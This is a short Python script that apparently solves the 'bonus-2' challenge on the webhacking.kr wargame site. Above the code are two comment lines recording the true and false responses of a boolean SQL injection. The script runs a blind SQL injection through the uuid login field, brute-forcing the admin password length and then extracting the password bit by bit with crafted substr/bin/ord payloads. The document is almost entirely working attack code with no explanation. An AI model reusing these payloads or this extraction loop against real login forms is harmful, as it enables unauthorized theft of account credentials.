#admin' and 1=1# True : Wrong Password!
#admin' and 1=2# False : login fail!

import requests
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
cookies = {'PHPSESSID': 'your session'}


def sqli():
	passLen = 0
	password = ''
	url = "https://webhacking.kr/challenge/bonus-2/index.php"
	for i in range(1,40):
		postData = {'uuid':"admin' and length(pw)={} and id='admin'#".format(i),'pw':'admin'}
		x = requests.post(url,headers=headers,data=postData,cookies=cookies)
		if "Wrong password!" in x.text:
			print("admin password length: ", i)
			passLen = i

	for i in range(1,passLen+1):	
		bit = ''
		for k in range(1, 9):
			postData = {'uuid':"admin' and substr(lpad(bin(ord(substr(pw,{},1))),8,0),{},1)=1 and id='admin'#".format(i,k),'pw':'admin'}
			x = requests.post(url,headers=headers,data=postData,cookies=cookies)
			if "Wrong password!" in x.text:
				bit += '1'
			else:
				bit += '0'
		password += chr(int(bit,2))
	
	print("admin password hash: ", password)
		

sqli()
